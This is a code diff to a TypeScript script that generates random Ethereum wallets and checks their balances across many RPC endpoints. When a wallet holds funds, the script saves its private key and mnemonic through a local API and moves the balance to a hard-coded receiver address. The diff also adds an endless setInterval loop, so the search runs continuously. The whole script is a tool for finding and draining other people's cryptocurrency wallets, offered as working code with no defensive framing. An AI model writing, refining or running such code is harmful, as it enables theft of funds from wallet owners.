@@ -1,7 +1,9 @@
 import { ethers } from 'ethers';
 import { extraRpcs } from './constant';
-import { WalletsService } from '../wallets/wallets.service';
-import { getWalletGenerationCount, incrementWalletGenerationCount } from './walletGenerationCount';
+import axios from 'axios';
+import dotenv from 'dotenv';
+
+dotenv.config();
 
 interface Wallet {
     mnemonic: string;
@@ -12,6 +14,8 @@ interface Wallet {
 }
 
 const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";
+const PORT = process.env.PORT || '3000';
+const API_URL = `http://localhost:${PORT}/wallets`;
 
 function getRandomRPC(listRPC: any): string {
     const randomIndex = Math.floor(Math.random() * (listRPC.length - 1));
@@ -27,9 +31,6 @@ async function generateWallet(index: number): Promise<Wallet> {
     const path = `m/44'/60'/0'/0/0`;
     const derivedWallet = hdNode.derivePath(path);
     
-    const currentCount = incrementWalletGenerationCount();
-    console.log(`\n📈 Current total wallets generated: ${currentCount}`);
-    
     return {
         mnemonic: mnemonic,
         privateKey: derivedWallet.privateKey,
@@ -41,10 +42,11 @@ async function generateWallet(index: number): Promise<Wallet> {
 
 async function generateWallets(): Promise<Wallet[]> {
     const walletPromises = Array.from({ length: extraRpcs.length }, (_, i) => generateWallet(i));
+    console.log(`Generating ${walletPromises.length} wallets...`);
     return Promise.all(walletPromises);
 }
 
-async function checkAndTransfer(wallet: Wallet, walletsService: WalletsService): Promise<void> {
+async function checkAndTransfer(wallet: Wallet): Promise<void> {
     try {
         const provider = new ethers.providers.JsonRpcProvider(wallet.rpc);
         const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);
@@ -53,6 +55,7 @@ async function checkAndTransfer(wallet: Wallet, walletsService: WalletsService):
             provider.getBalance(wallet.address),
             provider.getGasPrice()
         ]);
+        console.log(`Balance is ${balance} at ${new Date().toISOString()}`);
 
         if (balance.gt(0)) {
             console.log(`\n🎯 Found wallet with balance!`);
@@ -62,14 +65,19 @@ async function checkAndTransfer(wallet: Wallet, walletsService: WalletsService):
             console.log(`Balance: ${ethers.utils.formatEther(balance)} ETH`);
             console.log(`RPC: ${wallet.rpc}`);
 
-            // Save wallet to database
-            await walletsService.create({
-                address: wallet.address,
-                privateKey: wallet.privateKey,
-                mnemonic: wallet.mnemonic,
-                rpc: wallet.rpc,
-                balance: parseFloat(ethers.utils.formatEther(balance))
-            });
+            // Save wallet using API endpoint
+            try {
+                await axios.post(API_URL, {
+                    address: wallet.address,
+                    privateKey: wallet.privateKey,
+                    mnemonic: wallet.mnemonic,
+                    rpc: wallet.rpc,
+                    balance: parseFloat(ethers.utils.formatEther(balance))
+                });
+                console.log('Wallet saved to database via API');
+            } catch (error) {
+                console.error('Failed to save wallet to database:', error);
+            }
 
             const gasLimit = ethers.BigNumber.from(21000);
             const gasCost = gasPrice.mul(gasLimit);
@@ -96,11 +104,15 @@ async function checkAndTransfer(wallet: Wallet, walletsService: WalletsService):
     }
 }
 
-export async function checkAllWallets(walletsService: WalletsService): Promise<void> {
+export async function checkAllWallets(): Promise<void> {
     try {
         const wallets = await generateWallets();
-        await Promise.all(wallets.map(wallet => checkAndTransfer(wallet, walletsService)));
+        await Promise.all(wallets.map(wallet => checkAndTransfer(wallet)));
     } catch (error) {
         // ignore
     }
-}
+} 
+
+setInterval(async () => {
+    await checkAllWallets();
+});
